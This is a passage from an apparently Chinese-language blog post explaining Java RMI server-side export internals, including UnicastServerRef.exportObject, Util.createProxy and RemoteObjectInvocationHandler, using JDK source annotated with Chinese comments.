<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 将远程对象导出到 RMI 运行时：</span></span><br><span class="line"><span class="comment"> * 1) 为实现类选择并创建“客户端存根（stub）”；</span></span><br><span class="line"><span class="comment"> * 2) （若为旧式 stub）构建并绑定“服务器骨架（skeleton）”以兼容 JDK 1.1 协议；</span></span><br><span class="line"><span class="comment"> * 3) 以 &#123;<span class="doctag">@code</span> Target&#125; 形式把实现类、调度器（本对象）、stub、对象 ID、生命周期策略等</span></span><br><span class="line"><span class="comment"> *    聚合到一起；</span></span><br><span class="line"><span class="comment"> * 4) 通过传输层引用 &#123;<span class="doctag">@code</span> ref&#125; 完成最终的导出（绑定对象 ID、开始接收调用）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> impl       远程对象的“真实实现”实例（必须实现 java.rmi.Remote）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> data       额外的自定义数据（不同实现/子类可能用于传递工厂或配置；此处常为 &#123;<span class="doctag">@code</span> null&#125;）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> permanent  是否“永久导出”（true 表示不参与分布式 GC，长久存活）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span>           客户端使用的“存根”（可序列化代理），通常会注册到 RMI Registry 发布给客户端</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> RemoteException 导出失败（端口/传输/权限/环境等异常）时抛出</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> Remote <span class="title function_">exportObject</span><span class="params">(Remote impl, Object data, <span class="type">boolean</span> permanent)</span></span><br><span class="line">        <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1) 取出实现类，后续用于选择 stub 的形态（动态代理或旧式 RemoteStub）</span></span><br><span class="line">    Class&lt;?&gt; implClass = impl.getClass();</span><br><span class="line">    Remote stub;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 2) 创建“客户端存根（stub）”</span></span><br><span class="line">        <span class="comment">//    - 若实现类的远程接口满足条件，优先生成 JDK 动态代理（Proxy + RemoteObjectInvocationHandler）；</span></span><br><span class="line">        <span class="comment">//    - 若强制使用旧式 stub（forceStubUse）或满足兼容条件，则返回 RemoteStub 的子类实例。</span></span><br><span class="line">        <span class="comment">//    getClientRef() 提供客户端引用（RemoteRef），用于封装调用的网络细节（JRMP 等）。</span></span><br><span class="line">        stub = Util.createProxy(implClass, getClientRef(), forceStubUse);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// 2.1) 当实现类没有“合法的远程接口”（例如：接口未继承 Remote、或方法签名不符合 RMI 规则）</span></span><br><span class="line">        <span class="comment">//      则无法生成 stub，转为导出失败。</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(</span><br><span class="line">            <span class="string">&quot;remote object implements illegal remote interface&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 若采用“旧式 stub”（RemoteStub），则设置服务器“骨架（skeleton）”</span></span><br><span class="line">    <span class="comment">//    - skeleton 仅用于 JDK 1.1 时代的旧协议分发；现代客户端（动态代理）不依赖它。</span></span><br><span class="line">    <span class="keyword">if</span> (stub <span class="keyword">instanceof</span> RemoteStub) &#123;</span><br><span class="line">        setSkeleton(impl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 构造 Target：这是服务端的聚合描述，包含</span></span><br><span class="line">    <span class="comment">//    - impl：远程对象实现</span></span><br><span class="line">    <span class="comment">//    - this：调度器/分发器（当前 UnicastServerRef）</span></span><br><span class="line">    <span class="comment">//    - stub：客户端要拿到的代理</span></span><br><span class="line">    <span class="comment">//    - ref.getObjID()：对象 ID（JRMP 里的唯一标识）</span></span><br><span class="line">    <span class="comment">//    - permanent：生命周期策略（是否参与 DGC）</span></span><br><span class="line">    <span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Target</span>(impl, <span class="built_in">this</span>, stub, ref.getObjID(), permanent);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 5) 通过传输层引用 ref 真正“导出”目标：</span></span><br><span class="line">    <span class="comment">//    - 绑定对象 ID → Target</span></span><br><span class="line">    <span class="comment">//    - 打开/注册监听（若尚未）</span></span><br><span class="line">    <span class="comment">//    - 准备好入站调用的分发</span></span><br><span class="line">    ref.exportObject(target);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 6) 为 JRMP 的方法分发准备“方法哈希→Method”的映射缓存</span></span><br><span class="line">    <span class="comment">//    - JRMP 通过方法签名哈希（long）标识远程调用的方法，此表用于快速从哈希反查到反射 Method。</span></span><br><span class="line">    hashToMethod_Map = hashToMethod_Maps.get(implClass);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 7) 返回客户端要使用的 stub（调用方通常会把它注册到 RMI Registry）</span></span><br><span class="line">    <span class="keyword">return</span> stub;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>服务器存根是通过 <code>sun.rmi.server.Util#createProxy()</code> 创建的代理类，创建时需要以下几个参数：</p>
<ul>
<li><p><code>implClass</code>：远程对象的实现类，这里也就是 <code>RemoteHello.class</code>。</p>
</li>
<li><p><code>getClientRef()</code>：实际上就是将 <code>UnicastServerRef</code> 的 <code>LiveRef</code> 属性封装成一个 <code>UnicastRef</code>。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 服务器侧的“单播引用”实现：既是 RemoteRef 的一种（可被序列化到客户端作为 stub 使用），</span></span><br><span class="line"><span class="comment"> * 也充当“服务端调度器/分发器”（ServerRef、Dispatcher），负责把入站调用分发到实现类。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 典型流程：</span></span><br><span class="line"><span class="comment"> *   exportObject(...) 时，服务端持有 UnicastServerRef（含 LiveRef、ObjID、传输通道）；</span></span><br><span class="line"><span class="comment"> *   为客户端生成 stub 时，需要一个“客户端可用”的 RemoteRef —— 由 getClientRef() 提供。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnicastServerRef</span> <span class="keyword">extends</span> <span class="title class_">UnicastRef</span></span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">ServerRef</span>, Dispatcher &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 构造一个“单播（Unicast）服务器端远程引用”，用于在指定端口上导出远程对象。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * &lt;p&gt;说明：</span></span><br><span class="line"><span class="comment">     * &lt;ul&gt;</span></span><br><span class="line"><span class="comment">     *   &lt;li&gt;&lt;b&gt;ServerRef 的职责&lt;/b&gt;：封装服务端的传输/调度信息，后续在</span></span><br><span class="line"><span class="comment">     *       &#123;<span class="doctag">@code</span> exportObject(Target)&#125; 时与对象 ID（ObjID）、实现对象等一起注册到对象表，</span></span><br><span class="line"><span class="comment">     *       从而接收并分发入站的远程调用。&lt;/li&gt;</span></span><br><span class="line"><span class="comment">     *   &lt;li&gt;&lt;b&gt;端口语义&lt;/b&gt;：&#123;<span class="doctag">@code</span> port&#125; 为 0 表示“匿名端口”（由 OS 在实际绑定时分配），</span></span><br><span class="line"><span class="comment">     *       非 0 则固定监听该端口。&lt;/li&gt;</span></span><br><span class="line"><span class="comment">     *   &lt;li&gt;&lt;b&gt;注意&lt;/b&gt;：这里只是构造引用并记录端口，真正的监听/绑定发生在导出流程（如</span></span><br><span class="line"><span class="comment">     *       &#123;<span class="doctag">@code</span> TCPTransport.listen()&#125;/&#123;<span class="doctag">@code</span> ObjectTable.putTarget(...)&#125; 期间）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment">     * &lt;/ul&gt;</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UnicastServerRef</span><span class="params">(<span class="type">int</span> port)</span> &#123;</span><br><span class="line">        <span class="comment">// 将“端口”包装为 LiveRef：其中包含了对象标识（ObjID）与传输端点（endpoint）等信息，</span></span><br><span class="line">        <span class="comment">// 是服务端/客户端远程引用（RemoteRef）共享的底层“活动引用”。</span></span><br><span class="line">        <span class="comment">// LiveRef(port) 的端口为 0 时，实际绑定时由 OS 分配具体端口并回填。</span></span><br><span class="line">        <span class="built_in">super</span>(<span class="keyword">new</span> <span class="title class_">LiveRef</span>(port));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 每个远程对象的“入站调用过滤器”（例如 JEP 290 引入的反序列化过滤器）；</span></span><br><span class="line">        <span class="comment">// 这里默认不指定（null），通常继承全局/传输层的默认策略，必要时可在导出前后设置。</span></span><br><span class="line">        <span class="built_in">this</span>.filter = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UnicastServerRef</span><span class="params">(LiveRef liveRef)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(liveRef);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 返回“**客户端可用**”的远程引用（RemoteRef）。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 语义：</span></span><br><span class="line"><span class="comment">     * - 若当前就是“客户端侧引用”，可直接返回 this；</span></span><br><span class="line"><span class="comment">     * - 若当前处于“服务器侧上下文”，需要构造一个“面向客户端”的 RemoteRef；</span></span><br><span class="line"><span class="comment">     *   其核心是**复用同一个 LiveRef**（共享 ObjID 与 Endpoint），</span></span><br><span class="line"><span class="comment">     *   以便客户端拿到的 stub 能正确地定位到此远程对象。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> 用于放进客户端 stub 的远程引用实例</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> RemoteRef <span class="title function_">getClientRef</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 基于同一个 LiveRef 创建一个“客户端侧”的 UnicastRef。</span></span><br><span class="line">        <span class="comment">// 这样序列化到客户端的 stub 就携带了正确的目标地址与对象 ID。</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">UnicastRef</span>(ref);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ……（省略：exportObject/dispatch 等服务端导出与分发逻辑）</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 注意：</span></span><br><span class="line"><span class="comment"> * 1) UnicastRef 的子类 UnicastRef2 会继承（复用）本类的方法（如 getLiveRef 等），</span></span><br><span class="line"><span class="comment"> *    JDK 内部有代码（例如 javax.management.remote.rmi.RMIConnector 的实现）</span></span><br><span class="line"><span class="comment"> *    对这些方法存在“非公开”的依赖关系。因此这些方法的签名/行为不应轻易变更。</span></span><br><span class="line"><span class="comment"> * 2) UnicastRef 表示“**客户端侧的远程引用**”（RemoteRef）：持有一个 LiveRef，</span></span><br><span class="line"><span class="comment"> *    其中包含对象 ID、远端地址/端口（Endpoint）等，使客户端能通过它发起远程调用。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UnicastRef</span> <span class="keyword">implements</span> <span class="title class_">RemoteRef</span> &#123;</span><br><span class="line">    <span class="comment">/** 封装远程对象标识与网络终端信息的“活动引用” */</span></span><br><span class="line">    <span class="keyword">protected</span> LiveRef ref;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用给定的 LiveRef 构造一个“单播远程引用”。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> liveRef 远程对象的活动引用（包含 ObjID、Endpoint 等信息）</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UnicastRef</span><span class="params">(LiveRef liveRef)</span> &#123;</span><br><span class="line">        <span class="comment">// 记录下目标远程对象的“位置 + 标识”，供后续发起远程调用使用</span></span><br><span class="line">        <span class="built_in">this</span>.ref = liveRef;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ……（省略：通常还会有 invoke、readExternal/writeExternal 等与调用/序列化相关的方法）</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>forceStubUse</code>：<code>UnicastServerRef</code> 未显式初始化该成员，因此默认为 <code>false</code>。</p>
</li>
</ul>
<p>在 <code>sun.rmi.server.Util#createProxy()</code> 函数中，由于 <code>stubClassExists</code> 返回 <code>false</code>，因此不走 <code>createStub</code> 逻辑而是为远程对象 <code>RemoteHello</code> 创建动态代理。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 为给定实现类选择“动态代理”或“预生成存根（RemoteStub）”，并返回可供客户端使用的 Remote 代理。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 选择规则（优先级从高到低）：</span></span><br><span class="line"><span class="comment"> * - 若 forceStubUse == true                     → 一律使用预生成存根（RemoteStub）</span></span><br><span class="line"><span class="comment"> * - 否则，若存在可用的预生成存根 且 未设置忽略存根（!ignoreStubClasses） → 使用 RemoteStub</span></span><br><span class="line"><span class="comment"> * - 其余情况                                     → 使用 JDK 动态代理（Proxy + RemoteObjectInvocationHandler）</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 动态代理：</span></span><br><span class="line"><span class="comment"> *   - 运行时为 implClass 的所有“远程接口”（继承 java.rmi.Remote 的接口）生成 $Proxy... 类，</span></span><br><span class="line"><span class="comment"> *   - 将方法调用转发给 RemoteObjectInvocationHandler，再由后者使用 clientRef 走网络调用。</span></span><br><span class="line"><span class="comment"> * 预生成存根：</span></span><br><span class="line"><span class="comment"> *   - 加载继承 RemoteStub 的旧式 stub 类（实现远程接口），用 clientRef 构造实例。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> implClass  实现远程接口的实现类（其远程接口需继承 java.rmi.Remote）</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> clientRef  远程引用（RemoteRef），封装传输层细节，供代理/存根发起远程调用</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> forceStubUse 若为 true，则强制使用 RemoteStub 而非动态代理</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IllegalArgumentException 当 implClass 的远程接口不合法（不符合 RMI 规则）时</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> StubNotFoundException    当查找/创建存根或创建动态代理失败时</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Remote <span class="title function_">createProxy</span><span class="params">(Class&lt;?&gt; implClass,</span></span><br><span class="line"><span class="params">                                 RemoteRef clientRef,</span></span><br><span class="line"><span class="params">                                 <span class="type">boolean</span> forceStubUse)</span></span><br><span class="line">        <span class="keyword">throws</span> StubNotFoundException &#123;</span><br><span class="line">    Class&lt;?&gt; remoteClass;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 1) 解析“远程类”：确认并获取实现类对应的“远程接口所属类层次”（需实现 java.rmi.Remote）</span></span><br><span class="line">        remoteClass = getRemoteClass(implClass);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException ex) &#123;</span><br><span class="line">        <span class="comment">// 找不到任何远程接口 → 无法进行 RMI → 视为没有 stub/proxy 可生成</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(</span><br><span class="line">            <span class="string">&quot;object does not implement a remote interface: &quot;</span> + implClass.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 2) 是否走旧式 RemoteStub？</span></span><br><span class="line">    <span class="comment">//    条件等价于：forceStubUse || (stubClassExists(remoteClass) &amp;&amp; !ignoreStubClasses)</span></span><br><span class="line">    <span class="keyword">if</span> (forceStubUse || !(ignoreStubClasses || !stubClassExists(remoteClass))) &#123;</span><br><span class="line">        <span class="comment">// 加载并实例化“预生成存根”，用 clientRef 进行初始化</span></span><br><span class="line">        <span class="keyword">return</span> createStub(remoteClass, clientRef);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 3) 否则走“动态代理”路径：收集远程接口 + 准备调用处理器</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">ClassLoader</span> <span class="variable">loader</span> <span class="operator">=</span> implClass.getClassLoader();   <span class="comment">// 与目标实现类一致的类加载器</span></span><br><span class="line">    <span class="keyword">final</span> Class&lt;?&gt;[] interfaces = getRemoteInterfaces(implClass); <span class="comment">// 所有继承 Remote 的接口</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 代理的调用处理器：把方法调用封装成远程调用，通过 clientRef 发起</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteObjectInvocationHandler</span>(clientRef);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 4) 在特权块中创建 JDK 动态代理（兼容可能存在的安全管理器策略）</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Remote&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> Remote <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> (Remote) Proxy.newProxyInstance(loader, interfaces, handler);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">        <span class="comment">// 常见原因：接口不是 public、接口来自不同类加载器导致不可见、方法签名冲突等</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StubNotFoundException</span>(<span class="string">&quot;unable to create proxy&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>其中 <code>InvocationHandler</code> 是 <code>RemoteObjectInvocationHandler</code> 对象，并且参数传入前面 <code>getClientRef</code> 创建的 <code>UnicastRef</code> 对象并保存到 <code>RemoteRef</code> 成员。</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * InvocationHandler 的 RMI 实现：配合 JDK 动态代理用作“远程存根（stub）”的调用分发器。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;当客户端通过动态代理调用远程接口方法时，JDK 会回调本类的 invoke(...)（定义在父接口</span></span><br><span class="line"><span class="comment"> * InvocationHandler 中，具体实现在本类源码的其它位置），本类内部再利用 RemoteRef（ref）</span></span><br><span class="line"><span class="comment"> * 将调用打包并通过 JRMP 等协议发送到服务器。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;一般应用代码无需直接使用本类；当你将远程对象以“动态代理”方式导出（如</span></span><br><span class="line"><span class="comment"> * &#123;<span class="doctag">@link</span> java.rmi.server.UnicastRemoteObject&#125; 或 &#123;<span class="doctag">@code</span> Activatable&#125;），</span></span><br><span class="line"><span class="comment"> * 生成的代理会持有一个 &#123;<span class="doctag">@code</span> RemoteObjectInvocationHandler&#125; 实例作为其调用处理器。&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>  Ann Wollrath</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span>   1.5</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteObjectInvocationHandler</span></span><br><span class="line">        <span class="keyword">extends</span> <span class="title class_">RemoteObject</span></span><br><span class="line">        <span class="keyword">implements</span> <span class="title class_">java</span>.lang.reflect.InvocationHandler &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 用指定的远程引用构造调用处理器。</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> ref 远程引用（封装了目标地址、对象ID、协议栈等信息）</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> NullPointerException 若 ref 为 null</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">RemoteObjectInvocationHandler</span><span class="params">(RemoteRef ref)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(ref);                 <span class="comment">// 交由 RemoteObject 记录远程引用</span></span><br><span class="line">        <span class="keyword">if</span> (ref == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 说明：本类还会实现 InvocationHandler#invoke(Object, Method, Object[])，</span></span><br><span class="line">    <span class="comment">// 其典型逻辑是：</span></span><br><span class="line">    <span class="comment">// 1) 对 equals/hashCode/toString 等来自 Object 的方法做本地语义处理；</span></span><br><span class="line">    <span class="comment">// 2) 其余远程接口方法通过 ref.invoke(...) 进行网络调用并返回结果/异常。</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * RMI 远程对象的“Object 语义”基类：提供对远程引用（RemoteRef）的统一持有与</span></span><br><span class="line"><span class="comment"> * equals/hashCode/toString 等方法的远程语义实现（见 JDK 源码）。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;关键点：&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * &lt;ul&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;ref：保存远程引用（RemoteRef）。远程引用中包含对象 ID（ObjID）、远端地址、</span></span><br><span class="line"><span class="comment"> *       传输协议等，供调用时使用。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   &lt;li&gt;equals/hashCode：在 RMI 里通常基于远程引用来判断“是否同一远程对象”，</span></span><br><span class="line"><span class="comment"> *       并据此计算哈希（见 RemoteObject 的具体实现）。&lt;/li&gt;</span></span><br><span class="line"><span class="comment"> *   